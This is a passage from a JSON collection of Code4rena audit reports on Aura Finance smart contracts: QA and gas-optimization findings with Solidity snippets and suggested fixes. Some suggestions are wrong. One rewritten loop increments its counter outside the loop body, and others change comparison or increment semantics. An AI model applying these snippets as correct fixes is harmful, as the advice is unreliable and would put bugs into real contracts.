}\n```\n\nPoolManagerProxy.owner:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/PoolManagerProxy.sol#L42-L45\n\n```solidity\n    //set owner - only OWNER\n    function setOwner(address _owner) external onlyOwner{\n        owner = _owner;\n    }\n```\n\nowner:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol#L57-L60\n\n```solidity\n    //set owner - only OWNER\n    function setOwner(address _owner) external onlyOwner{\n        owner = _owner;\n    }\n```\n\nowner:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/VoterProxy.sol#L73-L76\n\n```solidity\n    function setOwner(address _owner) external {\n        require(msg.sender == owner, \"!auth\");\n        owner = _owner;\n    }\n```\n\nadmin:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraVestedEscrow.sol#L73-L80\n\n```solidity\n    /**\n     * @notice Change contract admin\n     * @param _admin New admin address\n     */\n    function setAdmin(address _admin) external {\n        require(msg.sender == admin, \"!auth\");\n        admin = _admin;\n    }\n```\n\nDAO change:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraMerkleDrop.sol#L79\n\n## Recommended Mitigation Steps\n\nConsider utilizing two-step ownership transferring process (proposition and acceptance in the separate actions) with a noticeable delay between the steps to enforce the transparency and stability of the system.\n\n\n### 5. Arrays lengths aren't checked (non-critical)\n\nAuraVestedEscrow.fund:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraVestedEscrow.sol#L96-L100\n\n```solidity\n    function fund(address[] calldata _recipient, uint256[] calldata _amount) external nonReentrant {\n        require(!initialised, \"initialised already\");\n\n        uint256 totalAmount = 0;\n        for (uint256 i = 0; i < _recipient.length; i++) {\n```\n\nArbitartorVault.distribute:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ArbitartorVault.sol#L42-L49\n\n```solidity\n    /**\n    * @notice  Permissioned fn to distribute any accrued rewards to a relevant stash\n    * @dev     Only called by operator: ConvexMultisig\n    */\n    function distribute(address _token, uint256[] calldata _toPids, uint256[] calldata _amounts) external {\n       require(msg.sender == operator, \"!auth\");\n\n       for(uint256 i = 0; i < _toPids.length; i++){\n```\n\n### 6. Floating pragma is used across the system (non-critical)\n\nAs different compiler versions have critical behavior specifics if the contracts get accidentally deployed using another compiler version compared to the one they were tested with, various types of undesired behavior can be introduced.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraVestedEscrow.sol#L2\n\n```solidity\npragma solidity ^0.8.11;\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/Aura.sol#L2\n\n```solidity\npragma solidity ^0.8.11;\n```\n\n## Recommended Mitigation Steps\n\nConsider fixing the version:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Interfaces.sol#L2\n\n\n### 7. Scaling multiplier hardcode can lead to future mistakes (non-critical)\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L97-L98\n\n```solidity\n        uint256 rPerT = (_amount * 1e20) / supply;\n        rewardData[_token][_epoch] += rPerT;\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L257\n\n```solidity\nreturn (balance * rewardData[_token][_epoch]) / 1e20;\n```\n\n### 8. Config addresses are not checked (non-critical)\n\nAuraBalRewardPool:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraBalRewardPool.sol#L62-L75\n\n```solidity\n    constructor(\n        address _stakingToken,\n        address _rewardToken,\n        address _rewardManager,\n        address _auraLocker,\n        address _penaltyForwarder,\n        uint256 _startDelay\n    ) {\n        stakingToken = IERC20(_stakingToken);\n        rewardToken = IERC20(_rewardToken);\n        rewardManager = _rewardManager;\n        auraLocker = IAuraLocker(_auraLocker);\n        penaltyForwarder = _penaltyForwarder;\n        rewardToken.safeApprove(_auraLocker, type(uint256).max);\n```\n\nAuraStakingProxy:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraStakingProxy.sol#L58-L80\n\n```solidity\n    /**\n     * @param _rewards       vlCVX\n     * @param _crv           CRV token\n     * @param _cvx           CVX token\n     * @param _cvxCrv        cvxCRV token\n     * @param _crvDepositorWrapper    Wrapper that converts CRV to CRVBPT and deposits\n     * @param _outputBps     Configurable output bps where 100% == 10000\n     */\n    constructor(\n        address _rewards,\n        address _crv,\n        address _cvx,\n        address _cvxCrv,\n        address _crvDepositorWrapper,\n        uint256 _outputBps\n    ) {\n        rewards = _rewards;\n        owner = msg.sender;\n        crv = _crv;\n        cvx = _cvx;\n        cvxCrv = _cvxCrv;\n        crvDepositorWrapper = _crvDepositorWrapper;\n        outputBps = _outputBps;\n```\n\nClaimFeesHelper:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ClaimFeesHelper.sol#L25-L38\n\n```solidity\n    /**\n     * @param _booster      Booster.sol, e.g. 0xF403C135812408BFbE8713b5A23a04b3D48AAE31\n     * @param _voterProxy   CVX VoterProxy e.g. 0x989AEb4d175e16225E39E87d0D97A3360524AD80\n     * @param _feeDistro    FeeDistro e.g. 0xA464e6DCda8AC41e03616F95f4BC98a13b8922Dc\n     */\n    constructor(\n        address _booster,\n        address _voterProxy,\n        address _feeDistro\n    ) {\n        booster = IBooster(_booster);\n        voterProxy = _voterProxy;\n        feeDistro = IFeeDistributor(_feeDistro);\n    }\n```\n\nAuraLocker:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L147-L164\n\n```solidity\n    constructor(\n        string memory _nameArg,\n        string memory _symbolArg,\n        address _stakingToken,\n        address _cvxCrv,\n        address _cvxCrvStaking\n    ) Ownable() {\n        _name = _nameArg;\n        _symbol = _symbolArg;\n        _decimals = 18;\n\n        stakingToken = IERC20(_stakingToken);\n        cvxCrv = _cvxCrv;\n        cvxcrvStaking = _cvxCrvStaking;\n\n        uint256 currentEpoch = block.timestamp.div(rewardsDuration).mul(rewardsDuration);\n        epochs.push(Epoch({ supply: 0, date: uint32(currentEpoch) }));\n    }\n```\n\nAuraBalRewardPool:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraBalRewardPool.sol#L62-L79\n\n```solidity\n    constructor(\n        address _stakingToken,\n        address _rewardToken,\n        address _rewardManager,\n        address _auraLocker,\n        address _penaltyForwarder,\n        uint256 _startDelay\n    ) {\n        stakingToken = IERC20(_stakingToken);\n        rewardToken = IERC20(_rewardToken);\n        rewardManager = _rewardManager;\n        auraLocker = IAuraLocker(_auraLocker);\n        penaltyForwarder = _penaltyForwarder;\n        rewardToken.safeApprove(_auraLocker, type(uint256).max);\n\n        require(_startDelay < 2 weeks, \"!delay\");\n        startTime = block.timestamp + _startDelay;\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider using zero address checks to ensure correct configuration\n\n### 9. ClaimFeesHelper's claimFees can end up wasting gas if the balance condition cannot be currently met (non-critical)\n\n## Proof of Concept\n\nIf the condition can be satisfied, the loop isn't needed. If it can't the loop achieves nothing, just end up using all the gas:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/ClaimFeesHelper.sol#L50-53\n\n## Recommended Mitigation Steps\n\nConsider removing the loop, it looks like debug code to be cleaned up.",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/362"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1.\nTitle: Using != is more gas efficient\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L68\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L139\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L210\n\nRecommended Mitigation Steps:\n```   \n    require(_amount != 0, \"Must mint something\");\n```\n\n========================================================================\n\n2.\nTitle: unnecessary variable set. the default value of uint is 0\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L35\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L38-L39\n\nRecommended Mitigation Steps:\nremove 0 value\n\n========================================================================\n\n3.\nTitle: Using delete statement to empty `rewards[msg.sender]` can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L179\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraClaimZap.sol#L191-L192\n\nRecommended Mitigation Steps:\n```\n    delete rewards[msg.sender];\n```\n\n========================================================================\n\n4.\nTitle: Using unchecked and prefix increment\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraClaimZap.sol#L143-L153\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L773\n\nRecommended Mitigation Steps:\n```\nfor (uint256 i = 0; i < rewardContracts.length;) {\n            IBasicRewards(rewardContracts[i]).getReward(msg.sender, true);\n        }\n    unchecked{\n        ++i; //@audit-info: Place here with unchecked\n        }\n```\n\n========================================================================\n\n5.\nTitle: Unnecessary variable set of bool\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L114\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L33\n\nRecommended Mitigation Steps:\nthe default value of bool is `false`. remove it for gas opt\n\n========================================================================\n\n6.\nTitle: Use `reward` that already been cache\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L177-L179\n\nRecommended Mitigation Steps:\n```\nif (reward > 0) {\n            reward = 0;\n```\n\n========================================================================\n\n7.\nTitle: Using > is cheaper than >=\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L216-L217\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L829\n\nRecommended Mitigation Steps:\njust use `>` can save gas\n```\n\trequire(_delay > 1, \"min delay\"); //minimum 2 epochs of grace\n```\n\n========================================================================\n\n8.\nTitle: Gas opt to substract\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L484\n\nRecommended Mitigation Steps:\n```\n\tuint256 i = --len;\n```\n\n========================================================================\n\n9.\nTitle: Using `calldata` to store struct data type can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L583\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L627\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L769\n\nRecommended Mitigation Steps:\n```\n\tfunction checkpoints(address account, uint32 pos) external view virtual returns (DelegateeCheckpoint calldata) {\n```\n\n========================================================================\n\n10.\nTitle: Using `storage` to declare Struct variable inside function\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L521\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L600\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L794\n\nRecommended Mitigation Steps:\n```\n    DelegateeCheckpoint storage ckpt = _checkpointsLookup(_checkpointedVotes[account], epoch);\n```\n\n========================================================================\n\n11.\nTitle: Using SafeMath for solidity >0.8\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraBalRewardPool.sol#L24\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L35\n\nRecommended Mitigation Steps:\nit's better to remove `using SafeMath for uint256` for solidity >0.8\nreference: https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2465\n\n========================================================================\n\n12.\nTitle: Cheaper to use `++` instead `+ 1`\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L636\n\nRecommended Mitigation Steps:\n```\n\tlow = ++mid;\n```\n\n========================================================================\n\n13.\nTitle: set as immutable\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraMerkleDrop.sol#L26\n\nRecommended Mitigation Steps:\nadd immutable\n\n========================================================================\n\n14.\nTitle: Using multiple `require` instead `&&` can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L159\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L203\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/BalLiquidityProvider.sol#L48\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/BalLiquidityProvider.sol#L57\n\nRecommended Mitigation Steps:\n```\n\trequire(_token != crv, \"not allowed\");\n\trequire(_token != cvx, \"not allowed\");\n\trequire(_token != cvxCrv, \"not allowed\");\n```\n\n========================================================================\n\n15.\nTitle: Using unchecked can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L162\n\nRecommended Mitigation Steps:\n```\nunchecked{\n\tuint256 elapsed = _time - startTime;\n}\n```\n\n========================================================================\n\n16.\nTitle: better increment\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L100\n\nRecommended Mitigation Steps:\nChange `i++` to `++i`\n\n========================================================================\n\n17.\nTitle: Gas improvement on calling SafeERC20.function\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-05-aura/blob/main/contracts/ExtraRewardsDistributor.sol#L15\n\nRecommended Mitigation Steps:\nby removing L#15 and directly call `SafeERC20`\n\nExample L#93:\n```\n    SafeERC20.safeTransferFrom(_token, msg.sender, address(this), _amount);\n```\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/359"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**[S]**: Suggested optimation, save a decent amount of gas without compromising readability;\n\n**[M]**: Minor optimation, the amount of gas saved is minor, change when you see fit;\n\n**[N]**: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [S] Avoid unnecessary storage read can save gas\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L170-L188\n\n```solidity\n    modifier updateReward(address _account) {\n        {\n            Balances storage userBalance = balances[_account];\n            uint256 rewardTokensLength = rewardTokens.length;\n            for (uint256 i = 0; i < rewardTokensLength; i++) {\n                address token = rewardTokens[i];\n                uint256 newRewardPerToken = _rewardPerToken(token);\n                rewardData[token].rewardPerTokenStored = newRewardPerToken.to96();\n                rewardData[token].lastUpdateTime = _lastTimeRewardApplicable(rewardData[token].periodFinish).to32();\n                if (_account != address(0)) {\n                    userData[_account][token] = UserData({\n                        rewardPerTokenPaid: newRewardPerToken.to128(),\n                        rewards: _earned(_account, token, userBalance.locked).to128()\n                    });\n                }\n            }\n        }\n        _;\n    }\n```\n\nThe value of `userBalance.locked` is not changed in for loop, so using a `memory` cache can avoid unnecessary storage read to save some gas.\n\n### Recommendation\n\nChange to:\n\n```solidity\n    uint256 userBalanceLocked = _account != address(0) ? balances[_account].locked : 0;\n    uint256 rewardTokensLength = rewardTokens.length;\n    for (uint256 i = 0; i < rewardTokensLength; i++) {\n        address token = rewardTokens[i];\n        uint256 newRewardPerToken = _rewardPerToken(token);\n        rewardData[token].rewardPerTokenStored = newRewardPerToken.to96();\n        rewardData[token].lastUpdateTime = _lastTimeRewardApplicable(rewardData[token].periodFinish).to32();\n        if (_account != address(0)) {\n            userData[_account][token] = UserData({\n                rewardPerTokenPaid: newRewardPerToken.to128(),\n                rewards: _earned(_account, token, userBalanceLocked).to128()\n            });\n        }\n    }\n```\n\n\n\n## [S] Avoid unnecessary arithmetic operations can save gas\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L382-L384\n\n```solidity\n        uint256 expiryTime = _checkDelay == 0 && _relock\n            ? block.timestamp.add(rewardsDuration)\n            : block.timestamp.sub(_checkDelay);\n```\n\n\nWhen `_checkDelay > 0`, `expiryTime = block.timestamp.sub(_checkDelay)`. \n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L400-L401\n\n```solidity\n            if (_checkDelay > 0) {\n                uint256 currentEpoch = block.timestamp.sub(_checkDelay).div(rewardsDuration).mul(rewardsDuration);\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L410-L427\n\n```solidity\n            for (uint256 i = nextUnlockIndex; i < length; i++) {\n                //unlock time must be less or equal to time\n                if (locks[i].unlockTime > expiryTime) break;\n\n                //add to cumulative amounts\n                locked = locked.add(locks[i].amount);\n\n                //check for kick reward\n                //each epoch over due increases reward\n                if (_checkDelay > 0) {\n                    uint256 currentEpoch = block.timestamp.sub(_checkDelay).div(rewardsDuration).mul(rewardsDuration);\n                ...\n            }\n```\n\n\nAt L401 and L420, `block.timestamp.sub(_checkDelay)` can be changed to `expiryTime` to avoid arithmetic operations in loop and improve code readability in the same time.\n\n###  Recommendation\n\n```solidity\n    if (_checkDelay > 0) {\n        uint256 currentEpoch = expiryTime.div(rewardsDuration).mul(rewardsDuration);\n\n```\n\n## [S] Check `validatorId < validatorsN` can be done earlier\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L380-L385\n\n```solidity\n        uint256 length = locks.length;\n        uint256 reward = 0;\n        uint256 expiryTime = _checkDelay == 0 && _relock\n            ? block.timestamp.add(rewardsDuration)\n            : block.timestamp.sub(_checkDelay);\n        require(length > 0, \"no locks\");\n```\n\nThe check of `length > 0` can be done earlier to avoid unnecessary code executation.\n\n### Recommendation\n\nChange to:\n\n```solidity\n        uint256 length = locks.length;\n        require(length > 0, \"no locks\");\n\n        uint256 reward = 0;\n        uint256 expiryTime = _checkDelay == 0 && _relock\n            ? block.timestamp.add(rewardsDuration)\n            : block.timestamp.sub(_checkDelay);\n```\n\n\n## [S] Outdated versions of OpenZeppelin library\n\nOutdated versions of OpenZeppelin library are used.\n\nIt's a best practice to use the latest version of libraries.\n\nNew versions of OpenZeppelin libraries can be more gas effeicant. \n\nFor exmaple:\n\n`ERC20.sol` in @openzeppelin/contracts@4.4.2:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/3a54e2026a8b0267e3b9d3784981627e02210bc0/contracts/Aura.sol#L20\n\n```solidity\ncontract AuraToken is ERC20 {\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/3a54e2026a8b0267e3b9d3784981627e02210bc0/yarn.lock#L1322-L1325\n\n```plaintext\n\"@openzeppelin/contracts-0.8@npm:@openzeppelin/contracts@4.4.2\":\n  version \"4.4.2\"\n  resolved \"https://registry.yarnpkg.com/@openzeppelin/contracts/-/contracts-4.4.2.tgz#4e889c9c66e736f7de189a53f8ba5b8d789425c2\"\n  integrity sha512-NyJV7sJgoGYqbtNUWgzzOGW4T6rR19FmX1IJgXGdapGPWsuMelGJn9h03nos0iqfforCbCB0iYIR0MtIuIFLLw==\n```\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.4.2/contracts/token/ERC20/ERC20.sol#L155-L161\n\n```solidity\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n```\n\n\nA gas optimization upgrade has been added to @openzeppelin/contracts@4.6.0:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.6.0/contracts/token/ERC20/ERC20.sol#L163-L165\n\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n```\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.6.0/contracts/token/ERC20/ERC20.sol#L330-L342\n\n```solidity\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n```\n\n## [M] Check if `_time <= startTime` can save gas\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraVestedEscrow.sol#L158-L163\n\n```solidity\n        if (_time < startTime) {\n            return 0;\n        }\n        uint256 locked = totalLocked[_recipient];\n        uint256 elapsed = _time - startTime;\n        total = AuraMath.min((locked * elapsed) / totalTime, locked);\n```\n\n### Recommendation\n\nChange to:\n\n```solidity\n        if (_time <= startTime) {\n            return 0;\n        }\n        uint256 locked = totalLocked[_recipient];\n        uint256 elapsed = _time - startTime;\n        total = AuraMath.min((locked * elapsed) / totalTime, locked);\n```\n\n## [M] Only using `SafeMath` when necessary can save gas\n\nFor the arithmetic operations that will never over/underflow, using SafeMath will cost more gas.\n\nFor example:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/VirtualBalanceRewardPool.sol#L241-L248\n\n```solidity\n        if (block.timestamp >= periodFinish) {\n            rewardRate = reward.div(duration);\n        } else {\n            uint256 remaining = periodFinish.sub(block.timestamp);\n            uint256 leftover = remaining.mul(rewardRate);\n            reward = reward.add(leftover);\n            rewardRate = reward.div(duration);\n        }\n```\n\nAt L244, `periodFinish - block.timestamp` will never underflow.\n\n### Recommendation\n\nChange to:\n\n```solidity\n            uint256 remaining = periodFinish - block.timestamp;\n```\n\n## [M] Setting `uint256` variables to `0` is redundant\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L72\n\n```solidity\n    uint256 public queuedCvxCrvRewards = 0;\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L381\n\n```solidity\n        uint256 reward = 0;\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L630\n\n```solidity\n        uint256 low = 0;\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L231-L232\n\n```solidity\n        uint256 claimableTokens = 0;\n```\n\n...\n\nSetting `uint256` variables to `0` is redundant as they default to `0`.\n\n## [M] Setting `bool` variables to `false` is redundant\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L114\n\n```solidity\n    bool public isShutdown = false;\n```\n\nSetting `bool` variables to `false` is redundant as they default to `false`.\n\n## [M] `++i` is more efficient than `i++`\n\nUsing `++i` is more gas efficient than `i++`, especially in a loop.\n\nFor example:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L174\n\n```solidity\n        for (uint256 i = 0; i < rewardTokensLength; i++)\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L306\n\n```solidity\n        for (uint256 i; i < rewardTokensLength; i++)\n```\n...",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/349"
    }
  },
  {
    "title": "QA Report",
    "body": "## [N] Contract file name does not follow coding conventions\n\nHaving a consistent naming style in the project leads to fewer errors.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/Aura.sol#L20\n\n```solidity\ncontract AuraToken is ERC20 {\n```\n\nThe filename `Aura.sol` should be `AuraToken.sol`.\n\n\n## [N] Misleading comment\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L386-L389\n\n```solidity\n// e.g. now = 16\n// if contract is shutdown OR latest lock unlock time (e.g. 17) <= now - (1)\n// e.g. 17 <= (16 + 1)\nif (isShutdown || locks[length - 1].unlockTime <= expiryTime) {\n```\n\nAt L387 `now - (1) = 16 - 1 = 15`. The comment is wrong.\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/Aura.sol#L108-L111\n\n```solidity\n// e.g. (new) reduction = (500 - 100) * 2.5 + 700 = 1700;\n// e.g. (new) reduction = (500 - 250) * 2.5 + 700 = 1325;\n// e.g. (new) reduction = (500 - 400) * 2.5 + 700 = 950;\nuint256 reduction = totalCliffs.sub(cliff).mul(5).div(2).add(700);\n```\n`2.5 `\n\n\n## [L] Critical operations should emit events\n\nAcross the contracts, there are certain critical operations that change critical values that affect the users of the protocol.\n\nIt's a best practice for these setter functions to emit events to record these changes on-chain for off-chain monitors/tools/interfaces to register the updates and react if necessary.\n\nInstances include:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/cCrv.sol#L38-L41\n\n```solidity\nfunction setOperator(address _operator) external {\n    require(msg.sender == operator, \"!auth\");\n    operator = _operator;\n}\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L62-L65\n\n```solidity\nfunction setFeeManager(address _feeManager) external {\n    require(msg.sender == feeManager, \"!auth\");\n    feeManager = _feeManager;\n}\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L67-L70\n\n```solidity\nfunction setDaoOperator(address _daoOperator) external {\n    require(msg.sender == daoOperator, \"!auth\");\n    daoOperator = _daoOperator;\n}\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L72-L78\n\n```solidity\nfunction setFees(uint256 _lockIncentive) external{\n    require(msg.sender==feeManager, \"!auth\");\n\n    if(_lockIncentive >= 0 && _lockIncentive <= 30){\n        lockIncentive = _lockIncentive;\n    }\n}\n```\n\n## [L] Precision loss due to `div` before `mul`\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/CrvDepositorWrapper.sol#L73\n\n```solidity\nuint256 minOut = (((amount * 1e18) / bptOraclePrice) * minOutBps) / 10000;\n```\n\n### Recommendation\n\nCan be changed to:\n\n```solidity\nuint256 minOut = (((amount * 1e18) * minOutBps) / bptOraclePrice) / 10000;\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-aura-findings",
      "repo": "https://github.com/code-423n4/2022-05-aura-findings",
      "url": "https://github.com/code-423n4/2022-05-aura-findings/issues/348"
    }
  },
  {
    "title": "`CrvDepositor.sol` Wrong implementation of the 2-week buffer for lock",
    "severity": "medium",
